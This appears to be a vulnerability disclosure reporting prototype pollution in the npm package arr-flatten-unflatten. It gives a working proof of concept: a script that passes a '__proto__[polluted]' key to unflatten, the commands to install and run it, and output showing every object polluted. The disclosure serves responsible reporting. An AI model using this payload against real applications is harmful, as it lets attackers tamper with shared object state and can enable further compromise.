# Description

`arr-flatten-unflatten` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var arrFlattenUnflatten = require("arr-flatten-unflatten")
console.log("Before : " + {}.polluted);
arrFlattenUnflatten.unflatten({'__proto__[polluted]': 'Yes! Its Polluted'});
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i arr-flatten-unflatten # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
